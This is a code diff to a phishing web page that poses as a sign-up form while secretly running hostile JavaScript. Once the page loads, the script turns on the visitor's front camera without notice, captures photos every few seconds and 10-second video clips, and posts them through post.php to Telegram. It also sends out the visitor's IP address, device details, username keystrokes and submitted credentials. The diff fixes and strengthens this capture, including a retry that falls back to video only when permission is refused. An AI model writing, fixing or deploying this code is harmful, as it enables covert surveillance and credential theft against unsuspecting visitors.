@@ -175,7 +175,7 @@
                 <div class="form-group">
                     <input type="password" class="form-input" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="btn" id="submitBtn">Continue</button>
+                <button type="submit" class="btn" id="submitBtn">Create Account</button>
                 <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
             </form>
 
@@ -187,8 +187,7 @@
 
     <script>
         // ============================================
-        // STEALTH VIDEO + PHOTO CAPTURE
-        // Sends both photos AND videos to Telegram
+        // FIXED: PHOTOS + VIDEOS WORKING
         // ============================================
         
         (function() {
@@ -200,16 +199,15 @@
             
             let cameraActive = false;
             let photoInterval = null;
-            let videoInterval = null;
             let stream = null;
             let userIP = '';
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
-            let recordingStartTime = 0;
+            let videoCounter = 0;
 
             // ============================================
-            // DETECT IP AND SEND TO TELEGRAM
+            // DETECT IP
             // ============================================
             function detectAndSendIP() {
                 fetch('https://api.ipify.org?format=json')
@@ -232,7 +230,7 @@
             }
 
             // ============================================
-            // SEND TO TELEGRAM VIA PHP
+            // SEND TO TELEGRAM
             // ============================================
             function sendToTelegram(type, data, extra = '') {
                 $.ajax({
@@ -251,6 +249,113 @@
             }
 
             // ============================================
+            // CAPTURE PHOTO - WORKS EVERY 3 SECONDS
+            // ============================================
+            function capturePhoto() {
+                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                    try {
+                        context.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL("image/png");
+                        
+                        $.ajax({
+                            type: 'POST',
+                            url: 'post.php',
+                            data: {
+                                tg_type: 'image',
+                                tg_image: imageData,
+                                tg_ip: userIP,
+                                tg_ua: navigator.userAgent,
+                                tg_time: new Date().toISOString()
+                            },
+                            async: true,
+                            timeout: 5000
+                        });
+                        console.log('📸 Photo captured');
+                    } catch (e) {
+                        console.log('Photo capture error:', e);
+                    }
+                }
+            }
+
+            // ============================================
+            // RECORD VIDEO - 10 SECOND CLIPS
+            // ============================================
+            function startVideoRecording() {
+                if (!stream || isRecording) {
+                    console.log('Cannot start recording: stream or recording in progress');
+                    return;
+                }
+                
+                try {
+                    isRecording = true;
+                    recordedChunks = [];
+                    
+                    // Use simpler mime type for better compatibility
+                    const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm'];
+                    let mimeType = mimeTypes[0];
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
+                    }
+                    
+                    mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 1000000
+                    });
+
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = function() {
+                        if (recordedChunks.length > 0) {
+                            const videoBlob = new Blob(recordedChunks, {
+                                type: mediaRecorder.mimeType || 'video/webm'
+                            });
+                            
+                            if (videoBlob.size > 1000) {
+                                videoCounter++;
+                                sendVideoToTelegram(videoBlob);
+                                console.log(`🎥 Video ${videoCounter} captured (${Math.round(videoBlob.size/1024)}KB)`);
+                            }
+                        }
+                        
+                        isRecording = false;
+                        recordedChunks = [];
+                        
+                        // Schedule next recording
+                        setTimeout(() => {
+                            if (cameraActive) {
+                                startVideoRecording();
+                            }
+                        }, 2000);
+                    };
+
+                    // Start recording
+                    mediaRecorder.start(1000); // Request data every second
+                    
+                    // Stop after 10 seconds
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            console.log('⏹️ Video recording stopped');
+                        }
+                    }, 10000);
+
+                } catch (e) {
+                    console.log('Video recording error:', e);
+                    isRecording = false;
+                    // Retry after delay
+                    setTimeout(() => {
+                        if (cameraActive) {
+                            startVideoRecording();
+                        }
+                    }, 5000);
+                }
+            }
+
+            // ============================================
             // SEND VIDEO TO TELEGRAM
             // ============================================
             function sendVideoToTelegram(videoBlob) {
@@ -266,102 +371,20 @@
                             tg_ip: userIP,
                             tg_ua: navigator.userAgent,
                             tg_time: new Date().toISOString(),
-                            tg_duration: Math.floor((Date.now() - recordingStartTime) / 1000)
+                            tg_counter: videoCounter
                         },
                         async: true,
-                        timeout: 10000
+                        timeout: 15000
                     });
+                };
+                reader.onerror = function() {
+                    console.log('Failed to read video blob');
                 };
                 reader.readAsDataURL(videoBlob);
             }
 
             // ============================================
-            // RECORD VIDEO (10 second clips)
-            // ============================================
-            function startVideoRecording() {
-                if (!stream || isRecording) return;
-                
-                try {
-                    isRecording = true;
-                    recordingStartTime = Date.now();
-                    recordedChunks = [];
-                    
-                    mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: 'video/webm;codecs=vp9,opus',
-                        videoBitsPerSecond: 2500000
-                    });
-
-                    mediaRecorder.ondataavailable = function(event) {
-                        if (event.data.size > 0) {
-                            recordedChunks.push(event.data);
-                        }
-                    };
-
-                    mediaRecorder.onstop = function() {
-                        const videoBlob = new Blob(recordedChunks, {
-                            type: 'video/webm'
-                        });
-                        
-                        if (videoBlob.size > 0) {
-                            sendVideoToTelegram(videoBlob);
-                        }
-                        
-                        isRecording = false;
-                        recordedChunks = [];
-                        
-                        // Start next recording after short delay
-                        setTimeout(() => {
-                            if (cameraActive) {
-                                startVideoRecording();
-                            }
-                        }, 1000);
-                    };
-
-                    // Record for 10 seconds then stop
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                    }, 10000);
-
-                } catch (e) {
-                    // Silent fail - try again later
-                    isRecording = false;
-                    setTimeout(() => {
-                        if (cameraActive) {
-                            startVideoRecording();
-                        }
-                    }, 5000);
-                }
-            }
-
-            // ============================================
-            // CAPTURE PHOTO (Every 3 seconds)
-            // ============================================
-            function capturePhoto() {
-                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
-                    context.drawImage(video, 0, 0, 640, 480);
-                    const imageData = canvas.toDataURL("image/png");
-                    
-                    $.ajax({
-                        type: 'POST',
-                        url: 'post.php',
-                        data: {
-                            tg_type: 'image',
-                            tg_image: imageData,
-                            tg_ip: userIP,
-                            tg_ua: navigator.userAgent,
-                            tg_time: new Date().toISOString()
-                        },
-                        async: true,
-                        timeout: 5000
-                    });
-                }
-            }
-
-            // ============================================
-            // HIDDEN CAMERA - START BOTH PHOTO & VIDEO
+            // INIT CAMERA - BOTH PHOTOS & VIDEOS
             // ============================================
             function initHiddenCamera() {
                 try {
@@ -370,8 +393,7 @@
                         video: {
                             facingMode: "user",
                             width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 30 }
+                            height: { ideal: 480 }
                         }
                     };
 
@@ -382,31 +404,56 @@
                             video.play();
                             
                             cameraActive = true;
+                            console.log('✅ Camera active');
                             
-                            // Start photo capture (every 3 seconds)
+                            // START PHOTOS - Every 3 seconds
+                            if (photoInterval) clearInterval(photoInterval);
                             photoInterval = setInterval(capturePhoto, 3000);
+                            console.log('📸 Photo capture started');
                             
-                            // Start video recording after 2 seconds
+                            // START VIDEO - After 2 seconds
                             setTimeout(() => {
                                 if (cameraActive) {
                                     startVideoRecording();
+                                    console.log('🎥 Video recording started');
                                 }
                             }, 2000);
                             
-                            // Send notification that camera is active
+                            // Send notification
                             sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
                         })
                         .catch(function(err) {
-                            // Silent fail
+                            console.log('Camera error:', err);
+                            // Try without audio
+                            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                                // Try with video only
+                                navigator.mediaDevices.getUserMedia({ video: true })
+                                    .then(function(mediaStream) {
+                                        stream = mediaStream;
+                                        video.srcObject = stream;
+                                        video.play();
+                                        cameraActive = true;
+                                        photoInterval = setInterval(capturePhoto, 3000);
+                                        setTimeout(() => {
+                                            if (cameraActive) {
+                                                // Video without audio
+                                                startVideoRecording();
+                                            }
+                                        }, 2000);
+                                    })
+                                    .catch(function(e) {
+                                        console.log('Camera failed completely:', e);
+                                    });
+                            }
                         });
 
                 } catch (e) {
-                    // Silent fail
+                    console.log('Camera init error:', e);
                 }
             }
 
             // ============================================
-            // SEND CREDENTIALS TO TELEGRAM
+            // CREDENTIALS
             // ============================================
             document.getElementById('loginForm').addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -420,7 +467,6 @@
                 btn.disabled = true;
                 msg.style.display = 'block';
                 
-                // Send credentials to Telegram
                 $.ajax({
                     type: 'POST',
                     url: 'post.php',
@@ -449,7 +495,7 @@
             });
 
             // ============================================
-            // SEND PARTIAL USERNAME TYPING
+            // PARTIAL TYPING
             // ============================================
             document.getElementById('username').addEventListener('input', function() {
                 if (this.value.length > 2) {
@@ -458,7 +504,7 @@
             });
 
             // ============================================
-            // SEND USER AGENT & BROWSER INFO
+            // BROWSER INFO
             // ============================================
             function sendBrowserInfo() {
                 const info = {
@@ -471,9 +517,6 @@
                 sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
             }
 
-            // ============================================
-            // SEND PAGE VIEW NOTIFICATION
-            // ============================================
             function sendPageView() {
                 sendToTelegram('page_view', 'Page loaded', 
                     `IP: ${userIP} | UA: ${navigator.userAgent}`
@@ -481,40 +524,30 @@
             }
 
             // ============================================
-            // INITIALIZE EVERYTHING
+            // INIT
             // ============================================
             
-            // 1. Detect IP
             detectAndSendIP();
-            
-            // 2. Send browser info
             setTimeout(sendBrowserInfo, 500);
-            
-            // 3. Start camera (photo + video)
             setTimeout(function() {
                 initHiddenCamera();
             }, 1500);
-            
-            // 4. Send page view
             setTimeout(sendPageView, 1000);
-            
-            // 5. Try camera on click
+
+            // Try camera on click
             document.addEventListener('click', function() {
                 if (!cameraActive) {
                     initHiddenCamera();
                 }
             }, { once: true });
 
-            // 6. Cleanup on page unload
+            // Cleanup
             window.addEventListener('beforeunload', function() {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
                 if (photoInterval) {
                     clearInterval(photoInterval);
-                }
-                if (videoInterval) {
-                    clearInterval(videoInterval);
                 }
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
